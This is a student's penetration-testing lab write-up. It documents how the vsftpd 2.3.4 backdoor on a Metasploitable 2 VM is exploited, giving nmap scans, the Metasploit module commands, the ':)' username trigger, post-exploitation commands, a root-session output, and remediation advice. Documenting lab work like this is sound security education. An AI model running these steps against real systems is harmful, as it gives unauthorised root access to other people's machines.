# Metasploit Exploitation Lab — vsftpd 2.3.4 Backdoor
 
## Overview
A hands-on penetration testing lab documenting the exploitation of a
known backdoor vulnerability (vsftpd 2.3.4) against a Metasploitable 2
target using the Metasploit Framework. Demonstrates the full penetration
testing methodology from reconnaissance to post-exploitation.
 
## Lab Environment
- **Attacker:** Kali Linux 2026.1
- **Target:** Metasploitable 2 (Ubuntu 8.04)
- **Tool:** Metasploit Framework 6.4
- **Network:** Isolated VMware lab
 
## Attack Methodology
 
### Phase 1 — Reconnaissance (Nmap)
```bash
nmap -sV 192.168.x.x      # Service version detection
nmap -A 192.168.x.x       # Aggressive scan
nmap -p- 192.168.x.x      # Full port scan
```
 
### Phase 2 — Vulnerability Identification
- Nmap revealed vsftpd 2.3.4 running on Port 21
- CVE: vsftpd 2.3.4 contains a backdoor introduced in 2011
- Backdoor triggers when username contains ":)"
 
### Phase 3 — Exploitation (Metasploit)
```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <target_ip>
set LHOST <attacker_ip>
run
```
 
### Phase 4 — Post Exploitation
```bash
getuid          # Returns: root
sysinfo         # Target OS information
shell           # Drop into system shell
```
 
## Result
Successfully obtained **root shell** on target system.
 
```
[+] Backdoor has been spawned!
[*] Meterpreter session 1 opened
meterpreter > getuid
Server username: root
```
 
## Key Findings
- vsftpd 2.3.4 backdoor allows unauthenticated root access
- No firewall rules blocking FTP port 21
- Target running outdated Ubuntu 8.04 kernel
 
## Remediation
- Upgrade vsftpd to latest stable version
- Implement firewall rules restricting FTP access
- Replace FTP with SFTP (port 22)
- Apply all OS security patches
 
## Skills Demonstrated
- Network reconnaissance (Nmap)
- Vulnerability identification
- Metasploit Framework usage
- Post-exploitation techniques
- Penetration testing methodology
- Professional documentation
 
## ⚠️ Disclaimer
This test was conducted in a fully isolated lab environment against
a deliberately vulnerable machine (Metasploitable 2). This is for
educational purposes only. Never attempt this against systems you
do not own or have explicit written permission to test.
 
## Author
Somto Collins | Cybersecurity Student | NOUN | Early Code Institute, Abuja
 
